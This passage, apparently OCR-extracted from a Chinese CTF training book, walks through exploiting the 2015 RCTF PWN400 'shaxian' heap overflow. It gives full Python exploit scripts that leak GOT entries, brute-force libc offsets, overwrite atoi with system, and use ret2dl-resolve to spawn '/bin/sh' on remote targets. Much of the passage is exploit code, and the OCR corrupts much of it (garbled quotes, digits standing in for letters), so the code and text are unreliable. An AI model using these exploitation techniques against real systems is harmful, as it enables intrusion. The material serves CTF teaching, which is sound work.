pp_rsi_r15_ret=0x0000000000400591
leave_ret=0x400520
#modifyversymdynamicaddr0x40031e-index*2=0x3d57d6
write_data_to（0x600858,164(0x6fff0)+164（0x3d57d6))
write_data_to(0x600940,reloc_data)
write_data_to（0x600a10,sym_data)
#io.gdb_hint()
writedata to（0x600a80,func_name)
write data to（0x600aa0,“/bin/sh;lx00"）
 =do
rop+=164(p_rdi_ret)+164(0x600aa0)
#/bin/sh
rop += 164(PLT0)
rop +=164（index)
write_data_to（0x6009b0,rop)
io.gdb_hint()
io.write(0*0x10+164(0x6009b0-0x08)+164(leave_ret)
io.interact()
io= get_io(target)
pwn(io)
3.逻辑较为复杂的情况，x86（2015-rctf-PWN400之shaxian）
该题的逻辑较为复杂，是个菜单式的命令模式。漏洞位置在进入
diancai这个命令菜单时，申请了40字节的空间，但是对其中一部分
结构读取的时候却可以读取60字节，从而覆盖了后面的堆块，造成
堆溢出，如图11-23所示。
---
## Page 371
CTF特训营：技术详解、解题方法与
11.6真题解析
371/1144
head_ptr_804B1cθ=(gou_wu_che_struct *)nalloc(4Bu);
if (head_ptr_804B1c0)
head_ptr_804B1c0->next =t_head_ptr;
get_buff_804865D(0,head_ptr_804B1c0->type_buff,60,10);
puts("How many?");
tnp_ptr=head_ptr_804B1c0;
tnp_ptr->count=get_int_80486cD();
puts("Add to GOUwUcHE");
result=total_count_8e4B2E0+++1;
else
(o..3.)snd- tnsa.
图11-23
PWN400的反编译代码
其中，购物车的结构体信息如图11-24所示。
gou_wu_che_struct struc ;（sizeof=θx28,align=θx4)
count
PP
type_buff
db32dup（？)
next
PP
gou_wu_che_struct ends
图11-24结构体信息
由于程序是堆溢出，而且大小是40+8（presize+size）=48字
节，因此可以利用fastbin的结构进行堆块的利用。泄露信息的部分较
为简单，因为结构体中自带了nex指针，这个地方是可以覆盖的，所
以直接覆盖后，在打印信息的时候就可以直接泄露相关的got表信
息。打印部分（泄露信息）如图11-25所示。
---
## Page 372
CTF特训营：技术详解、解题方法与
11.6真题解析
372/1144
if（total_count_804B2Eθ）
type_buff,u1->count);
u1=（gou_wu_che_struct *)u1->next;
next =t_head_ptr;
get_buff_804865D(0,head_ptr_804B1c0->type_buff,60,10);
（..fueu moH.）snd
tnp_ptr = head_ptr_804B1c0;
tnp_ptr->count=get_int_80486cD();
puts("Add to GOUWUCHE");
result=total_count_804B2E0+++1;
图11-26任意写的漏洞点
然而本题的考点主要在于，ibc是主办方自已编译的，网上无法
查到，所以其偏移带有特殊性。这里必须通过桌种方法对其进行泄露
由于这里是堆中，修改的信息十分有限，不像栈那样简单，因此该题
同样采用两种方法来求解，具体如下。
1）对两个libc库中的函数进行爆破（当时打比赛的时候采用的方
法)。
根据以前的经验，system地址与aoti相距并不远（aoti在前）
system在后），而且这些库函数的地址大都比较规整，为0x10的整数
倍，于是想出暴力破解的思路，为了防止卡死，直接发送cat/home
ctf用lag下面的文件，根据读取的返回值，决定偏移是否成功。
---
## Page 374
CTF特训营：技术详解、解题方法与
11.6真题解析
374/1144
虽然偏移不会很大，但是为了节省时间，这里分了几个区段进行
暴力破解，如从0x0、0x5000、0xa000、0xc00开头的距离开始破
解，代码如下：
import struct
from zio import *
#target=(119.254.101.197,10000)
#target='/shaxian'
target=(180.76.178.48,23333)
def input_info(io):
io.read until('Address:)
io.writeline(132(0)+132(0x31)
io.read_until(number:)
io.writeline(a*244+l32(0x31))
def dian_cai(io,name,num):
io.read_until('choose:)
io.writeline(*1)
io.readuntil(Jianjiao')
io.writeline(name)
io.writeline(str(num))
def sublit(io):
io.read_until(choose:)
io.writeline(2)
def receipt(io,taitou):
io.read_until('choose:)
io.writeline(3)
io.writeline(taitou)
defreview(io):
io.read_until(choose:)
io.writeline(4)
def link_heap(io):
io.readuntil('choose:)
io.writeline('4)
io.read_until(2\n)
heap_ptr=132(io.read（4))
print hex(heap_ptr)
returnheap_ptr
---
## Page 375
CTF特训营：技术详解、解题方法与
11.6真题解析
375/1144
def leak lib(io):
io.read_until(choose:)
io.writeline('4)
io.read_until(*)
d= io.readline(）.strip(n)
returnint（d,10）&0xff
def pwn (target, dis):
io=zio（target,timeout=10000,print_read=COLORED（RAW,red)，print_write=
COLORED（RAW,green）)
#io =zio(target,timeout=10000,print_read=None,print_write=None)
input_info(io)
dian_cai(io,aaa',1)
read_got=0x0804b010
atoi_got=0x0804B038
#puts_got=0x0804b02c
payload=a*32+I32(atoi_got-4)
dian_cai(io,payload,2)
atoi_addr=link_heap(io)
#system_addr=0xf7e39190
#io.gdb_hint()
payload2='a32+I32(0x0804B1C0-8)
dian_cai（io,payload2,3)
sublit(io)
payload='a*4+l32(atoi_got)
offset_read=0x000da8d0
offset_system = 0x0003e800
offset_puts=0x000656a0
offset_atoi=0x0002fbb0
print"dis:",hex(dis),“com:",hex（offset _system-offset_atoi)
#libc base=atoi_addr-offset_atoi
#system_addr=libc_base +offset_system
#system_addr=libc_base +offset_puts
system_addr = atoi_addr + dis
system_addr = struct.unpack("r",132(system_addr)[0]
sublit(io)
dian_cai(io,payload,system_addr)
#io.writeline(/bin/cat/home/shaxian/flag)
io.writeline(/bin/shin)
io.interact()
#data =io.read（1024)
data=io.read_until_timeout（1)
if"RCTF"in data or“No such file”in data:
print“herre”
---
## Page 376
CTF特训营：技术详解、解题方法与
11.6真题解析
376/1144
file_w=open("flag-4002"，w)
data+="dis:"+hex(dis)+“com:"+hex(offset_system-offset_atoi)
file_w.write(data)
file_w.close()
exit(0)
else:
io.close()
#print"ok:"
#io.interact()
dis = 0x100
dis =0xe130
while dis=θ）
result= atoi（nptr）;
else
result =-1;
U2=*MK_FP（_GS_，20）^u4；
图11-27栈转移的关键点
找到的gadget如图11-28所示。
p_11_ebp_ret=0x08048c29
leave_ret=0x080485c8
图11-28抬高栈的gadget
整个exp的代码如下：
#--*-- coding:utf8 --*.
importstruct
fromzio import*
target ="/shaxian"
def get_io(target):
r_m=COLORED（RAW,“green")
---
## Page 378
CTF特训营：技术详解、解题方法与
11.6真题解析
378/1144
W_m=COLORED（RAW,“blue)
io=zio（target,timeout =9999,print_read =r_m,print_write =w_m）
return io
def dian_cai(io,name, count):
io.read_until("choose:\n")
io.writeline("1")
io.read_until("5.Jianjiaoln")
io.writeline(name)
io.readuntil("How many?\n")
io.writeline(str(count)
def submit（io):
io.read_until("choose:(n")
io.writeline("2")
def receipt（io,taitou):
io.read_until("choose:(n")
io.writeline("3")
io.read_until("Taitou:\n")
io.writeline(taitou)
defreview(io):
io.read_until("choose:In")
io.writeline("4")
#x86
#EIf32Rel*reloc=JMPREL+index
#EIf32_Sym*sym=&SYMTAB[(reloc->r_info)>>8)]
#i.e.*sym=DT_SYMTAB+（reloc->r_info)*4*4
#assert(（reloc->r_info）&0xff)==0x7）type
#if（sym->st_other)&3==0）if not resolved
#uint16_tndx=VERSYM[（reloc->r_info)>>8]ndx=0->local symbol
#rfoundversionversion=&l-> version[ndx]
#name= STRTAB+sym->st_name
def generate_x86_reloc_data(index,got_plt):
return |32(got_plt)+132(0x07+(index<<8)
def generate_x86_sym_data(name_offset):
returnI32（name_offset)+132（0)+132（0)+132（0x12)
#readelf-d/shaxian
DT_JMPREL=0x8048408#0x80482f8#offset,info
DT_STRTAB=0x80482ec#0x8048260#strings array
DT_SYMTAB=0x80481dc#0x80481e0#st_name,.st_info,s_other
DT_VERSYM=0x8048396#0x80482c0
PLT0=0x08048490#0x08048350
#x86
atoi_got=0x0804b038
system_got=atoi_got
#useful_addr= phone_number_804B0C0
---
## Page 379
CTF特训营：技术详解、解题方法与
11.6真题解析
379/1144
#useful addr=taitou 804B300
#useful_addr=address_804B1E0
useful_addr=0x804B1E0
#reloc index
#0x804B1E0=0x8048408+0x2dd8
reloc_index=0x2dd8
#set jmprel+indexwhere indexisrelocindex
#0x080499c0=0x80481e0+0x17e*16
#0x804b1ec=0x80481dc+0x301*16
reloc_data_addr=0x804B1E0
reloc_data=generate_x86_reloc_data(0x301,system_got)
#writereloc_datain0x804B1E0
#0x080499e0=0x8048260+0x1780
#0x804b1fc=0x80482ec+0x2f10
sym_data_addr=0x804b1ec
sym_data=generate_x86_sym_data(0x2f10)
#write sym_datain0x804b1ec
func_name_addr=0x804b1fc
func_name="systemlx00"
#write systemin0x804b1fc
bin_str_addr=0x804b1fc+0x08
bin_str ="/bin/sh;lx00"
#writebin_strinbin_str addr
defpwn(io):
address =reloc_data.ljust(sym_data_addr-reloc_data_addr,x00)
address += sym_data.ljust(func_name_addr-sym_data_addr,x00)
#address+=func_name
address+=func_name.ljust(bin_str_addr-func_name_addr,x00)
address += bin_str
address = address.just(0x80 + 4,a)
address +=(32（PLT0)+132（reloc_index)+I32(0x01010101)+132(bin_str_addr)
#address="a"*8
phone_number=’a'*(256-0x8-0x4) +132(0) +132(0x31)[:2]
io.read_until("YourAddress:\n")
io.writeline(address)
io.readuntil("YourPhonenumber:In")
io.writeline(phone_number)
name='a'*8
count=32
dian_cai(io,a'*20,count)
#0x8f81008
dian_cai(io,b'*20,count）
#0x8f81038
dian_cai(io,c*20,count)
#0x8f81068
submit(io)
malloc_got = 0x0804b028
---